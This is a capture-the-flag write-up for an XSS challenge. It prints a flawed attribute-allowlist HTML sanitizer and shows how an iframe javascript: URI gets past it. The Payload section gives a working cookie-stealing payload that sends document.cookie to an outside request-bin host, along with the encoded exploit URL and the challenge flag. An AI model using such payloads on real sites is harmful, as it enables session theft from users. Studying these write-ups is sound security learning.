# static-static-hosting
This is another XSS challenge where we tackel with another filter
## the filter
Under the network activities, we can find the filter.
```js
function clean(input) {
    const template = document.createElement('template');
    const html = document.createElement('html');
    template.content.appendChild(html);
    html.innerHTML = input;

    sanitize(html);

    const result = html.innerHTML;
    return result;
}

function sanitize(element) {
    const attributes = element.getAttributeNames();
    for (let i = 0; i < attributes.length; i++) {
        // Let people add images and styles
        if (!['src', 'width', 'height', 'alt', 'class'].includes(attributes[i])) {
            element.removeAttribute(attributes[i]);
        }
    }

    const children = element.children;
    for (let i = 0; i < children.length; i++) {
        if (children[i].nodeName === 'SCRIPT') {
            element.removeChild(children[i]);
            i --;
        } else {
            sanitize(children[i]);
        }
    }
}
```
Basically, this means that we could only use `['src', 'width', 'height', 'alt', 'class']` as our attributes in tags. This still gives us a lot of room to work with.
## Embed and Iframe
I thought about the `<embed>` and `<iframe>` tags as their `src` attribut could triger javascript.
However, when I tried, `<embed>` worked for me on my local computer but not the bot as I am running firefox and the bot is running chrome. But `<iframe>` wored for both.
## iframe
```html
<iframe src="javascript:alert(1)"></iframe>
```
And it worked! So the next step is to do the post-bin move and grab the `document.cookie`
## Payload
I encoded my payload into base64 and fed it to the bot. Moments later, I got the flag.
```html
<iframe src="javascript:window.location.assign(`https://postb.in/1593716639876-9019670642446?cookie=${document.cookie}`)"></iframe>
```
```
https://static-static-hosting.2020.redpwnc.tf/site/#PGlmcmFtZSBzcmM9ImphdmFzY3JpcHQ6d2luZG93LmxvY2F0aW9uLmFzc2lnbihgaHR0cHM6Ly9wb3N0Yi5pbi8xNTkzNzE2NjM5ODc2LTkwMTk2NzA2NDI0NDY/Y29va2llPSR7ZG9jdW1lbnQuY29va2llfWApIj48L2lmcmFtZT4=
```
```
flag{wh0_n33d5_d0mpur1fy}
```

